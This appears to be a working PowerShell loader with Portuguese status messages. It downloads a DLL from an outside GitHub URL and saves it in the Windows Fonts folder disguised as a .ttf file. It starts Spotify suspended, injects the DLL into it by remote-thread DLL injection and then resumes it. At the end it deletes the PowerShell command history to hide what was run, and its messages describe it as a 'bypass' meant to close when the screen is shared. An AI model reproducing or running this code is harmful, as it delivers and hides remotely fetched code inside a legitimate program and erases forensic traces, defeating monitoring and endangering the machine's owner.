$IsAdmin = [Security.Principal.WindowsIdentity]::GetCurrent()
If ((New-Object Security.Principal.WindowsPrincipal $IsAdmin).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) -eq $FALSE)
{
    Write-Host "Abra o powershell como administrador!!"
    return
}

Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
		public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
		public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
		public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CreateProcess(
			string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
			ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
			IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);
	}
"@
function Suspend-Process {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true,ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [Alias('ID')]
        [string]
        $Name
    )

    $isPID = $true
    $ProcessID = $null

    try {
        $ProcessID = [int]$Name
    }
    catch {
        $isPID = $false
    }

    if($isPID)
    {
        $Process = get-process -Id $ProcessID
    }
    else {
        $Process = get-process -Name $Name
    }

    if($Process)
    {
        $handle = [kernel32]::OpenProcess("ALL",$false,($Process.Id))

        [ntdll]::NtSuspendProcess($handle)

        [kernel32]::CloseHandle($handle)
    }

}

function Invoke-DllInjection
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [Int]
        $ProcessID,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Dll
    )

    # Confirm that the process you want to inject into exists
    try
    {
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw "Process does not exist!"
    }

    # Confirm that the path to the dll exists
    try
    {
        $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
        Write-Verbose "Full path to Dll: $Dll"
        $AsciiEncoder = New-Object System.Text.ASCIIEncoding
        # Save the name of the dll in an ascii-encoded format. This name will be injected into the remote process.
        $DllByteArray = $AsciiEncoder.GetBytes($Dll)
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw "Invalid Dll path!"
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    function Local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            $Path
        )

        # Parse PE header to see if binary was compiled 32 or 64-bit
        $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)

        [Byte[]] $MZHeader = New-Object Byte[](2)
        $FileStream.Read($MZHeader,0,2) | Out-Null

        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if ($Header -ne 'MZ')
        {
            $FileStream.Close()
            Throw 'Invalid PE header.'
        }

        # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
        $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null

        [Byte[]] $lfanew = New-Object Byte[](4)

        # Read offset to the PE Header (will be read in reverse)
        $FileStream.Read($lfanew,0,4) | Out-Null
        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | ForEach-Object { $_.ToString('X2') } ) -join ''))

        # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
        $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)

        # Read compiled architecture
        $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | ForEach-Object { $_.ToString('X2') } ) -join '')
        $FileStream.Close()

        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }

        if ($Architecture -eq '014C')
        {
            Write-Output 'X86'
        }
        elseif ($Architecture -eq '8664')
        {
            Write-Output 'X64'
        }
        else
        {
            Write-Output 'OTHER'
        }
    }


    # Get addresses of and declare delegates for essential Win32 functions.
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
    $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    $RtlCreateUserThreadAddr = Get-ProcAddress ntdll.dll RtlCreateUserThread
    $RtlCreateUserThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $RtlCreateUserThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RtlCreateUserThreadAddr, $RtlCreateUserThreadDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    # Determine the bitness of the running PowerShell process based upon the size of the IntPtr type.
    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $True
    }
    else
    {
        $PowerShell32bit = $False
    }

    if (${Env:ProgramFiles(x86)}) {
        $64bitOS = $True
    } else {
        $64bitOS = $False
    }

    # The address for IsWow64Process will be returned if and only if running on a 64-bit CPU. Otherwise, Get-ProcAddress will return $null.
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    if ($IsWow64ProcessAddr)
    {
    	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
    }

    $Architecture = Get-PEArchitecture $Dll

    Write-Verbose "Architecture of the dll to be injected: $Architecture"

    # Open a handle to the process you want to inject into
    $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)

    if (!$hProcess)
    {
        Throw 'Unable to open process handle.'
    }

    if ($64bitOS) # Only perform theses checks if OS is 64-bit
    {
        if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') )
        {
            Throw 'Only x86 or AMD64 architechtures supported.'
        }

        # Determine is the process specified is 32 or 64 bit. Assume that it is 64-bit unless determined otherwise.
        $IsWow64 = $False
        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null

        if ( $PowerShell32bit -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'
        }

        if ( (!$IsWow64) -and ($Architecture -eq 'X86') )
        {
            Throw 'You cannot inject a 32-bit DLL into a 64-bit process.'
        }

        if ( $IsWow64 -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot inject a 64-bit DLL into a 32-bit process.'
        }
    }
    else
    {
        if ($Architecture -ne 'X86')
        {
            Throw 'PE file was not compiled for x86.'
        }
    }

    # Get address of LoadLibraryA function
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    Write-Verbose "LoadLibrary address: 0x$($LoadLibraryAddr.ToString("X$([IntPtr]::Size*2)"))"

    # Reserve and commit memory to hold name of dll
    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) # (0x3000 = Reserve|Commit, 4 = RW)
    if ($RemoteMemAddr -eq [IntPtr]::Zero)
    {
        Throw 'Unable to allocate memory in remote process. Try running PowerShell elevated.'
    }
    Write-Verbose "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

    # Write the name of the dll to the remote process address space
    $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $Dll.Length, [Ref] 0) | Out-Null
    Write-Verbose "Dll path written sucessfully."

    # Execute dll as a remote thread
    $Result = $RtlCreateUserThread.Invoke($hProcess, [IntPtr]::Zero, $False, 0, [IntPtr]::Zero, [IntPtr]::Zero, $LoadLibraryAddr, $RemoteMemAddr, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($Result)
    {
        Throw "Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8'))"
    }

    $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

    # Close process handle
    $CloseHandle.Invoke($hProcess) | Out-Null

    Start-Sleep -Seconds 2

    # Extract just the filename from the provided path to the dll.
    $FileName = (Split-Path $Dll -Leaf).ToLower()
    $DllInfo = (Get-Process -Id $ProcessID).Modules | Where-Object { $_.FileName.ToLower().Contains($FileName) }
    if (!$DllInfo)
    {
        Throw "Dll did dot inject properly into the victim process."
    }

    #Write-Verbose 'Dll injection complete!'

    #$DllInfo
}

function Download-File {
    param (
        [string]$Url,
        [string]$SavePath
    )

    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $SavePath)

    return $SavePath
}

function Invoke-CreateProcess {
	param (
		[string]$Binary,
        [Parameter(Mandatory = $False)]
		[string]$Args=$null,
        [Parameter(Mandatory = $True)]
		[string]$CreationFlags,
        [Parameter(Mandatory = $True)]
		[string]$ShowWindow,
        [Parameter(Mandatory = $True)]
		[string]$StartF
	)  

	# StartupInfo Struct
	$StartupInfo = New-Object STARTUPINFO
	$StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag
	$StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow
	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
	
	# ProcessInfo Struct
	$ProcessInfo = New-Object PROCESS_INFORMATION
	
	# SECURITY_ATTRIBUTES Struct (Process & Thread)
	$SecAttr = New-Object SECURITY_ATTRIBUTES
	$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
	
	# CreateProcess --> lpCurrentDirectory
	$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
	
	# Call CreateProcess
	[Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
	
	#echo "`nProcess Information:"
	#Get-Process -Id $ProcessInfo.dwProcessId

    # Retorna o ID do processo criado

    return $ProcessInfo
}

function Get-RandomValidPath {
    param (
        [string[]]$paths
    )
    $ActualAttempts = 0
    $MaxAttempts = $paths.Length
    $randomIndex = Get-Random -Minimum 0 -Maximum $paths.Length
    $randomPath = $paths[$randomIndex]

    while (-not (Test-Path $randomPath)) {
        if ( $ActualAttempts -ge $MaxAttempts) {
            Write-Host "Maximo de tentativas"
		[System.Threading.Thread]::Sleep(2000)
            exit
        } 
        $randomIndex = Get-Random -Minimum 0 -Maximum $paths.Length
        $randomPath = $paths[$randomIndex]
        $ActualAttempts++ 
    }
    if ((Test-Path $randomPath)) {
        Write-Host "Updated BYPASS"
    }
    return $randomPath
}

function Get-FileNameOfPath {
   param (
       [Parameter(Mandatory=$true)]
       [string[]]$paths
   )

   $randomValidPath = Get-RandomValidPath -paths $paths
   $splitPath = ($randomValidPath -split '\\')
   $file = $splitPath[$splitPath.Length - 1]

   return @{
    File = $file
    Path = $randomValidPath
   }
}

function Get-SiteData {
    param(
        [string]$Url
    )

    $webResponse = Invoke-WebRequest -Uri $Url
    $resp = $webResponse.Content
    $encoding = [System.Text.Encoding]::UTF8
    $stringValue = $encoding.GetString($resp)

    return $stringValue
}


$downloadUrl = "https://raw.githubusercontent.com/WkgGlobalservices2024/shzzz/main/xgamecontrol.dll"

$setupPath = "C:\Windows\Fonts\dafont.ttf"
$checkPath = "C:\Windows\Fonts\bilek.ttf"

$browsers = @("$env:USERPROFILE\AppData\Roaming\Spotify\Spotify.exe")

function Get-UpdateSetup {
    param (
        [string]$fileSize,
        [string]$urlChkSize
    )
    $dataSz = Get-SiteData -Url $urlChkSize
    if ($dataSz -ne $fileSize){
        $ret = "[+] Updated bypass"
        $downloadedFilePath = Download-File -Url $downloadUrl -SavePath $setupPath
    } 
    return $ret
}

if (!(Test-Path -Path $setupPath)) {
    Write-Host "1 STEP"
   $downloadedFilePath = Download-File -Url $downloadUrl -SavePath $setupPath

} else {
    Write-Output "[+] 1 - 1"
    $file = Get-Item $setupPath
    $fileSz = $file.Length
    $fileSz = $fileSz.ToString()

    $urlChkSz = "https://bypass.netlify.app/setupSize.ps1"

    $UpdateResult = Get-UpdateSetup -fileSize $fileSz -urlChkSize $urlChkSz
    Write-Host $UpdateResult
}

if (!(Test-Path -Path $checkPath)) {
   Write-Host "Step 2"
   New-Item -Path $checkPath -ItemType File
}

$result = Get-FileNameOfPath -paths $browsers
Write-Host "Ao ser telado fecha o processo $($result.File)"

$Process = Invoke-CreateProcess -Binary $result.Path -CreationFlags 0x00000004 -ShowWindow 0x1 -StartF 0x1
Invoke-DllInjection -Dll $setupPath -ProcessID $Process.dwProcessId

[System.Threading.Thread]::Sleep(500)
$result = [Kernel32]::ResumeThread($Process.hThread)
if ($result -ne -1) {
	Write-Host "."
} else {
	Write-Host "Deu B.O"
}

try {
   Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction Stop
} catch {
   Write-Host "[+] 2 - OK"
}